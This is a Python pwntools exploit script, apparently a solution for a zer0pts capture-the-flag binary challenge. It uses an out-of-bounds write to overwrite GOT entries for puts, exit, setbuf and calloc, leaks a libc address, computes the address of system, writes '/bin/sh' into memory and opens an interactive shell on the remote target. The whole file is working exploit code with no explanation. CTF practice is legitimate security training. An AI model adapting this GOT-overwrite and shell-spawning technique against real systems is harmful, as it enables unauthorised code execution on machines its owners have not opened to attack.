from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "pwn.ctf.zer0pts.com"
    port = 9004
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, '\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip('\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(':')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r='= '):
    recvuntil(r)
    s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)

main_addr = 0x400737
_start = 0x400650

puts_got = 0x0601018
setbuf_got = 0x601020
printf_plt = 0x400600
printf_got = 0x601028
stdout_got = 0x601070
calloc_got = 0x601038

exit_plt = 0x400640
exit_got = 0x601048

nazo = 0x4007d4
ret = 0x40085a

binsh = 0x601100

def modify(pos, val):
    rs(-1)
    rs(pos // 4)
    rs(val)

def modify8(pos, val):
    modify(pos, val & 0xffffffff)
    modify(pos + 4, val >> 32)

modify(puts_got, main_addr)

modify8(exit_got, 0x0000000000400830)
modify8(setbuf_got, nazo)

#wait_for_attach()
#libc_base = just_u64(s)
#print(hex(libc_base))

rs(300)
recvuntil('arr[')
s = recvuntil(']')
print(s)
libc_lower = int(s)
system_lower = libc_lower - 0x196570
print(hex(libc_lower), hex(system_lower))
rs('+')


modify8(exit_got, ret)
modify8(binsh, u64("/bin/sh\x00"))

modify(calloc_got, system_lower)


wait_for_attach()
rs(str(binsh))

interactive()

